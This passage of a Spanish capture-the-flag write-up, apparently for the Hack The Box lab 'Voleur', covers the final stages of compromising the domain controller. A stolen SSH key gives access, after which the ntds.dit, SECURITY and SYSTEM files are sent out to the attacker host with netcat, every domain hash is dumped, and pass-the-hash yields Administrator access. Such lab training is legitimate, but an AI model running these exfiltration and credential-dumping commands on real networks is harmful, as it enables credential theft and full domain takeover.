Al conectarnos por SMB encontramos una clave id\_rsa que nos permitiría conectarnos por SSH sin contraseña, y una nota. Nos descargaremos ambos:

```shell-session
impacket-smbclient -k dc.voleur.htb
                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 04:09:59 2025 ..
drw-rw-rw-          0  Fri Jan 31 00:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Fri Jan 31 00:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..
-rw-rw-rw-       2602  Fri Jan 31 00:11:29 2025 id_rsa
-rw-rw-rw-        186  Fri Jan 31 00:07:35 2025 Note.txt.txt
# get Note.txt.txt
# get id_rsa
```

En la nota encontramos lo siguiente:

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ cat Note.txt.txt

Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

{% endcode %}

Recordemos que en el escaneo de puertos descubrimos que el puerto SSH corría por el puerto 2222:

```bash
PORT     STATE SERVICE       VERSION
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
```

Le damos los permisos correctos al `id_rsa` y nos conectamos por SSH. Concretamente el id\_rsa pertenece al usuario svc\_backup, por lo que nos conectaremos cómo este usuario:

```bash
chmod 600 id_rsa
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```

Pero al conectarnos vemos que no somos root, ni podemos acceder a /root,  por lo que habrá que escalar privilegios:

```shell-session
svc_backup@DC:~$ ls
svc_backup@DC:~$ cd /root
-bash: cd: /root: Permission denied
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

### Volcado de secretos

<figure><img src="/files/QRnXVC3cSnyohC6Keg8Z" alt=""><figcaption></figcaption></figure>

En la carpeta Active Directory nos encontramos el `ntds.dit`:

```shell-session
svc_backup@DC:/mnt/c/IT/Third-Line Support$ cd Backups/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls -la
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  .
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025  ..
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025 'Active Directory'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active\ Directory/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm
```

Y en Registry el SECURITY y SYSTEM necesarios para extraer el ntds.dit:

```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd registry/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
```

### Envío a la máquina atacante

Tenemos conectividad limitada, pero tenemos netcat, así que lo usaremos para enviarnos los archivos:

{% embed url="<https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers#con-netcat>" %}

```shell-session
afsh4ck@kali$ nc -lvp 4444 > SECURITY
```

```shell-session
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ nc 10.10.14.226 4444 < SECURITY
```

Lo mismo con SYSTEM:

```shell-session
afsh4ck@kali$ nc -lvp 4444 > SYSTEM
```

```shell-session
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ nc 10.10.14.226 4444 < SYSTEM
```

Y con el ntds.dit:

```shell-session
afsh4ck@kali$ nc -lvp 4444 > ntds.dit
```

```shell-session
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ nc 10.10.14.226 4444 < ntds.dit
```

### Extraer ntds.dit

Bingo! Tenemos un volcado completo de los hashes de todos los usuarios del sistema, incluído el de Administrator:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM local

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
```

### Solicitar ticket como administrator

Podemos solicitar un ticket Kerbero solamente con el hash del usuario:

```bash
impacket-getTGT voleur.htb/'administrator' -hashes ':e656e07c56d831611b577b160b259ad2'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```

```bash
export KRB5CCNAME="$PWD/administrator.ccache"
```

#### Acceso final como root

```bash
evil-winrm -i dc.voleur.htb -k -u Administrator -r VOLEUR.HTB
                                       
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                      
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                      
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   1:12 AM           2308 Microsoft Edge.lnk
-ar---         9/14/2025   9:35 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
db385214a881c6334243fa329*******
```
